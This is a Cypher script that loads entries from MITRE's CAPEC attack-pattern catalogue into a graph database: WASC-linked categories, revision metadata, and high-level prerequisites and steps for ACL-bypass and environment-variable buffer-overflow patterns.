MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 38, summary: "This category is related to the WASC Threat Classification 2.0 item HTTP Response Splitting"});
MERGE (:Reference{id: "REF-1", local_id: "R.358.1", title: "WASC Threat Classification 2.0", section: "WASC-25 - HTTP Response Splitting", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/HTTP-Response-Splitting"});
CREATE (:Category{id: 359, name: "WASC-26 - HTTP Request Smuggling", status: "Draft"});
CREATE (:Submission{id: 39});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 39, summary: "This category is related to the WASC Threat Classification 2.0 item HTTP Request Smuggling"});
MERGE (:Reference{id: "REF-1", local_id: "R.359.1", title: "WASC Threat Classification 2.0", section: "WASC-26 - HTTP Request Smuggling", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/HTTP-Request-Smuggling"});
CREATE (:Category{id: 360, name: "WASC-27 - HTTP Response Smuggling", status: "Draft"});
CREATE (:Submission{id: 40});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 40, summary: "This category is related to the WASC Threat Classification 2.0 item HTTP Response Smuggling"});
MERGE (:Reference{id: "REF-1", local_id: "R.360.1", title: "WASC Threat Classification 2.0", section: "WASC-27 - HTTP Response Smuggling", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/HTTP-Response-Smuggling"});
CREATE (:Category{id: 361, name: "WASC-28 - Null Byte Injection", status: "Draft"});
CREATE (:Submission{id: 41});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 41, summary: "This category is related to the WASC Threat Classification 2.0 item Null Byte Injection"});
MERGE (:Reference{id: "REF-1", local_id: "R.361.1", title: "WASC Threat Classification 2.0", section: "WASC-28 - Null Byte Injection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Null-Byte-Injection"});
CREATE (:Category{id: 362, name: "WASC-29 - LDAP Injection", status: "Draft"});
CREATE (:Submission{id: 42});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 42, summary: "This category is related to the WASC Threat Classification 2.0 item LDAP Injection"});
MERGE (:Reference{id: "REF-1", local_id: "R.362.1", title: "WASC Threat Classification 2.0", section: "WASC-29 - LDAP Injection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/LDAP-Injection"});
CREATE (:Category{id: 363, name: "WASC-30 - Mail Command Injection", status: "Draft"});
CREATE (:Submission{id: 43});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 43, summary: "This category is related to the WASC Threat Classification 2.0 item Mail Command Injection"});
MERGE (:Reference{id: "REF-1", local_id: "R.363.1", title: "WASC Threat Classification 2.0", section: "WASC-30 - Mail Command Injection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Mail-Command-Injection"});
CREATE (:Category{id: 364, name: "WASC-31 - OS Commanding", status: "Draft"});
CREATE (:Submission{id: 44});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 44, summary: "This category is related to the WASC Threat Classification 2.0 item OS Commanding"});
MERGE (:Reference{id: "REF-1", local_id: "R.364.1", title: "WASC Threat Classification 2.0", section: "WASC-31 - OS Commanding", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/OS-Commanding"});
CREATE (:Category{id: 365, name: "WASC-32 - Routing Detour", status: "Draft"});
CREATE (:Submission{id: 45});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 45, summary: "This category is related to the WASC Threat Classification 2.0 item Routing Detour"});
MERGE (:Reference{id: "REF-1", local_id: "R.365.1", title: "WASC Threat Classification 2.0", section: "WASC-32 - Routing Detour", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Routing-Detour"});
CREATE (:Category{id: 366, name: "WASC-33 - Path Traversal", status: "Draft"});
CREATE (:Submission{id: 46});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 46, summary: "This category is related to the WASC Threat Classification 2.0 item Path Traversal"});
MERGE (:Reference{id: "REF-1", local_id: "R.366.1", title: "WASC Threat Classification 2.0", section: "WASC-33 - Path Traversal", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Path-Traversal"});
CREATE (:Category{id: 367, name: "WASC-34 - Predictable Resource Location", status: "Draft"});
CREATE (:Submission{id: 47});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 47, summary: "This category is related to the WASC Threat Classification 2.0 item Predictable Resource Location"});
MERGE (:Reference{id: "REF-1", local_id: "R.367.1", title: "WASC Threat Classification 2.0", section: "WASC-34 - Predictable Resource Location", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Predictable-Resource-Location"});
CREATE (:Category{id: 368, name: "WASC-35 - SOAP Array Abuse", status: "Draft"});
CREATE (:Submission{id: 48});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 48, summary: "This category is related to the WASC Threat Classification 2.0 item SOAP Array Abuse"});
MERGE (:Reference{id: "REF-1", local_id: "R.368.1", title: "WASC Threat Classification 2.0", section: "WASC-35 - SOAP Array Abuse", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/SOAP-Array-Abuse"});
CREATE (:Category{id: 369, name: "WASC-36 - SSI Injection", status: "Draft"});
CREATE (:Submission{id: 49});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 49, summary: "This category is related to the WASC Threat Classification 2.0 item SSI Injection"});
MERGE (:Reference{id: "REF-1", local_id: "R.369.1", title: "WASC Threat Classification 2.0", section: "WASC-36 - SSI Injection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/SSI-Injection"});
CREATE (:Category{id: 370, name: "WASC-37 - Session Fixation", status: "Draft"});
CREATE (:Submission{id: 50});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 31});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 50, summary: "This category is related to the WASC Threat Classification 2.0 item Session Fixation"});
MERGE (:Reference{id: "REF-1", local_id: "R.370.1", title: "WASC Threat Classification 2.0", section: "WASC-37 - Session Fixation", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Session-Fixation"});
CREATE (:Category{id: 371, name: "WASC-38 - URL Redirector Abuse", status: "Draft"});
CREATE (:Submission{id: 51});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 51, summary: "This category is related to the WASC Threat Classification 2.0 item URL Redirector Abuse"});
MERGE (:Reference{id: "REF-1", local_id: "R.371.1", title: "WASC Threat Classification 2.0", section: "WASC-38 - URL Redirector Abuse", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/URL-Redirector-Abuse"});
CREATE (:Category{id: 372, name: "WASC-39 - XPath Injection", status: "Draft"});
CREATE (:Submission{id: 52});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 52, summary: "This category is related to the WASC Threat Classification 2.0 item XPath Injection"});
MERGE (:Reference{id: "REF-1", local_id: "R.372.1", title: "WASC Threat Classification 2.0", section: "WASC-39 - XPath Injection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/XPath-Injection"});
CREATE (:Category{id: 373, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-40 - Insufficient Process Validation", status: "Deprecated"});
CREATE (:Submission{id: 53});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 53, summary: "This category is related to the WASC Threat Classification 2.0 item Insufficient Process Validation"});
MERGE (:Reference{id: "REF-1", local_id: "R.373.1", title: "WASC Threat Classification 2.0", section: "WASC-40 - Insufficient Process Validation", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Insufficient-Process-Validation"});
CREATE (:Category{id: 374, name: "WASC-41 - XML Attribute Blowup", status: "Draft"});
CREATE (:Submission{id: 54});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 54, summary: "This category is related to the WASC Threat Classification 2.0 item XML Attribute Blowup"});
MERGE (:Reference{id: "REF-1", local_id: "R.374.1", title: "WASC Threat Classification 2.0", section: "WASC-41 - XML Attribute Blowup", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/XML-Attribute-Blowup"});
CREATE (:Category{id: 375, name: "WASC-42 - Abuse of Functionality", status: "Draft"});
CREATE (:Submission{id: 55});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 55, summary: "This category is related to the WASC Threat Classification 2.0 item Abuse of Functionality"});
MERGE (:Reference{id: "REF-1", local_id: "R.375.1", title: "WASC Threat Classification 2.0", section: "WASC-42 - Abuse of Functionality", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Abuse-of-Functionality"});
CREATE (:Category{id: 376, name: "WASC-43 - XML External Entities", status: "Draft"});
CREATE (:Submission{id: 56});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 56, summary: "This category is related to the WASC Threat Classification 2.0 item XML External Entities"});
MERGE (:Reference{id: "REF-1", local_id: "R.376.1", title: "WASC Threat Classification 2.0", section: "WASC-43 - XML External Entities", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/XML-External-Entities"});
CREATE (:Category{id: 377, name: "WASC-44 - XML Entity Expansion", status: "Draft"});
CREATE (:Submission{id: 57});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 57, summary: "This category is related to the WASC Threat Classification 2.0 item XML Entity Expansion"});
MERGE (:Reference{id: "REF-1", local_id: "R.377.1", title: "WASC Threat Classification 2.0", section: "WASC-44 - XML Entity Expansion", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/XML-Entity-Expansion"});
CREATE (:Category{id: 378, name: "WASC-45 - Fingerprinting", status: "Draft"});
CREATE (:Submission{id: 58});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 32});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 58, summary: "This category is related to the WASC Threat Classification 2.0 item Fingerprinting"});
MERGE (:Reference{id: "REF-1", local_id: "R.378.1", title: "WASC Threat Classification 2.0", section: "WASC-45 - Fingerprinting", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Fingerprinting"});
CREATE (:Category{id: 379, name: "WASC-46 - XQuery Injection", status: "Draft"});
CREATE (:Submission{id: 59});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 59, summary: "This category is related to the WASC Threat Classification 2.0 item XQuery Injection"});
MERGE (:Reference{id: "REF-1", local_id: "R.379.1", title: "WASC Threat Classification 2.0", section: "WASC-46 - XQuery Injection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/XQuery-Injection"});
CREATE (:Category{id: 380, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-47 - Insufficient Session Expiration", status: "Deprecated"});
CREATE (:Submission{id: 60});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 60, summary: "This category is related to the WASC Threat Classification 2.0 item Insufficient Session Expiration"});
MERGE (:Reference{id: "REF-1", local_id: "R.380.1", title: "WASC Threat Classification 2.0", section: "WASC-47 - Insufficient Session Expiration", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Insufficient-Session-Expiration"});
CREATE (:Category{id: 381, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-48 - Insecure Indexing", status: "Deprecated"});
CREATE (:Submission{id: 61});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 61, summary: "This category is related to the WASC Threat Classification 2.0 item Insecure Indexing"});
MERGE (:Reference{id: "REF-1", local_id: "R.381.1", title: "WASC Threat Classification 2.0", section: "WASC-48 - Insecure Indexing", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Insecure-Indexing"});
CREATE (:Category{id: 382, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-49 - Insufficient Password Recovery", status: "Deprecated"});
CREATE (:Submission{id: 62});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 62, summary: "This category is related to the WASC Threat Classification 2.0 item Insufficient Password Recovery"});
MERGE (:Reference{id: "REF-1", local_id: "R.382.1", title: "WASC Threat Classification 2.0", section: "WASC-49 - Insufficient Password Recovery", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Insufficient-Password-Recovery"});
CREATE (:Category{id: 403, name: "Social Engineering", status: "Draft"});
CREATE (:Submission{id: 63});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 63, summary: "Attack patterns within this category focus on the manipulation and exploitation of people. The techniques defined by each pattern are used to convince someone into performing actions or divulging confidential information, often resulting in access to computer systems or facilities. While similar to a confidence trick or simple fraud, the term typically applies to trickery or deception for the purpose of information gathering, fraud, or computer system access. In most cases the adversary never comes face-to-face with the victim."});
CREATE (:Category{id: 436, name: "DEPRECATED: Gain Physical Access", status: "Deprecated"});
CREATE (:Submission{id: 64});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 33});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 34});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description"});
CREATE (:PreviousEntryName{id: 12, name: "Gain Physical Access"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 64, summary: "This category has been deprecated as it is no longer used in any view."});
CREATE (:Category{id: 437, name: "Supply Chain", status: "Draft"});
CREATE (:Submission{id: 65});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 35});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 65, summary: "Attack patterns within this category focus on the disruption of the supply chain lifecycle by manipulating computer system hardware, software, or services for the purpose of espionage, theft of critical data or technology, or the disruption of mission-critical operations or infrastructure. Supply chain operations are usually multi-national with parts, components, assembly, and delivery occurring across multiple countries offering an attacker multiple points for disruption."});
CREATE (:Category{id: 512, name: "Communications", status: "Draft"});
CREATE (:Submission{id: 66});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 36});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 37});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 66, summary: "Attack patterns within this category focus on the exploitation of communications and related protocols. The techniques defined by each pattern are used by an adversary to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact."});
CREATE (:Category{id: 513, name: "Software", status: "Draft"});
CREATE (:Submission{id: 67});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 38});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 39});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 67, summary: "Attack patterns within this category focus on the exploitation of software applications. The techniques defined by each pattern are used to exploit these weaknesses in the application's design or implementation in an attempt to achieve a desired negative technical impact."});
CREATE (:Category{id: 514, name: "Physical Security", status: "Draft"});
CREATE (:Submission{id: 68});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 68, summary: "Attack patterns within this category focus on physical security. The techniques defined by each pattern are used to exploit weaknesses in the physical security of a system in an attempt to achieve a desired negative technical impact."});
CREATE (:Category{id: 515, name: "Hardware", status: "Draft"});
CREATE (:Submission{id: 69});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 40});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description, Relationships"});
CREATE (:Description{id: 69, summary: "Attack patterns within this category focus on the exploitation of the physical hardware used in computing systems. The techniques defined by each pattern reflect the replacement, destruction, modification and exploitation of hardware components that make up a system in an attempt to achieve a desired negative technical impact. Attacks against hardware component fall into several broad categories depending upon the relative sophistication of the attacker and the type of systems that are targeted. Attacks against hardware components differ from software attacks in that hardware-based attacks target the chips, circuit boards, device ports, or other components that comprise a computer system or embedded system. Sophisticated attacks may involve adding or removing jumpers to an exposed system, or applying sensors to portions of the motherboard to read data as it traverses the system bus."});
CREATE (:Category{id: 525, name: "DEPRECATED: Execute Code", status: "Deprecated"});
CREATE (:Submission{id: 70});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 41});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description, Relationships"});
CREATE (:Modification{id: 42});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description, Relationships"});
CREATE (:PreviousEntryName{id: 13, name: "Malicious Code Execution"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:PreviousEntryName{id: 14, name: "Execute Code"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 70, summary: "This category has been deprecated as it is no longer used in any view."});
CREATE (:Category{id: 526, name: "DEPRECATED: Alter System Components", status: "Deprecated"});
CREATE (:Submission{id: 71});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 43});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 44});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 45});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description"});
CREATE (:PreviousEntryName{id: 15, name: "Alter System Components"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 71, summary: "This category has been deprecated as it is no longer used in any view."});
CREATE (:Category{id: 527, name: "DEPRECATED: Manipulate System Users", status: "Deprecated"});
CREATE (:Submission{id: 72});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 46});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description"});
CREATE (:PreviousEntryName{id: 16, name: "Manipulate System Users"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 72, summary: "This category has been deprecated as it is no longer used in any view."});
CREATE (:AttackPattern{id: 1, name: "Accessing Functionality Not Properly Constrained by ACLs", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 2, text: "<div level=\"0\">\n  <p class=\"text\">The application must be navigable in a manner that associates elements (subsections) of the application with ACLs.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 3, text: "<div level=\"0\">\n  <p class=\"text\">The various resources, or individual URLs, must be somehow discoverable by the attacker</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 4, text: "<div level=\"0\">\n  <p class=\"text\">The administrator must have forgotten to associate an ACL or has associated an inappropriately permissive ACL with a particular navigable resource.</p>\n</div>"});
CREATE (:Submission{id: 73});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 47});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Pattern, References"});
CREATE (:Description{id: 73, summary: "OrderedDict([('Text', \"In applications, particularly web applications, access to functionality is mitigated by the authorization framework, whose job it is to map ACLs to elements of the application's functionality; particularly URL's for web apps. In the case that the administrator failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application or can run queries for data that he is otherwise not supposed to.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey", description: "<div level=\"0\">\n  <p class=\"text\">The attacker surveys the target application, possibly as a valid and authenticated user</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spidering web sites for all available links</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Brute force guessing of resource names</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Brute force guessing of user names / credentials</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Brute force guessing of function names / actions</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">ACLs or other access control mechanisms are present in the software</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">User IDs or other credentials are present in the software</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Operating modes with different privileges are present in the software</p>\n</div>"});
CREATE (:AttackStep{id: 2, title: "Identify Functionality", description: "<div level=\"0\">\n  <p class=\"text\">At each step, the attacker notes the resource or functionality access mechanism invoked upon performing specific actions</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use the web inventory of all forms and inputs and apply attack data to those inputs.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a packet sniffer to capture and record network traffic</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Execute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment, in order to find weaknesses that can be exploited in a production environment.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker produces a list of functionality or data that can be accessed through the system."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Iterate over access capabilities", description: "<div level=\"0\">\n  <p class=\"text\">Possibly as a valid user, the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Fuzzing of API parameters (URL parameters, OS API parameters, protocol parameters)</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Attempts to create a catalog of access mechanisms and data have failed.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Functionality is accessible to unauthorized users."});
MERGE (:Reference{local_id: "R.1.1", author: "ATT&CK Project", title: "File System Permissions Weakness (T1044)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Technique/T1044"});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 732});
MERGE (:CWE{id: 276});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 721});
MERGE (:CWE{id: 434});
CREATE (:ResourcesRequired{id: 2, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for the exploit of this pattern.</p>\n</div>"});
CREATE (:AttackPattern{id: 10, name: "Buffer Overflow via Environment Variables", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 5, text: "<div level=\"0\">\n  <p class=\"text\">The application uses environment variables.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 6, text: "<div level=\"0\">\n  <p class=\"text\">An environment variable exposed to the user is vulnerable to a buffer overflow.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 7, text: "<div level=\"0\">\n  <p class=\"text\">The vulnerable environment variable uses untrusted data.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 8, text: "<div level=\"0\">\n  <p class=\"text\">Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.</p>\n</div>"});
CREATE (:Submission{id: 74});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 48});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 74, summary: "OrderedDict([('Text', 'This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the attacker finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker tries to find an environment variable which can be overwritten for instance by gathering information about the target host (error pages, software's version number, etc.).</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker manipulates the environment variable to contain excessive-length content to cause a buffer overflow.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker potentially leverages the buffer overflow to inject maliciously crafted code in an attempt to execute privileged command on the target environment.</p>\n</div>"});
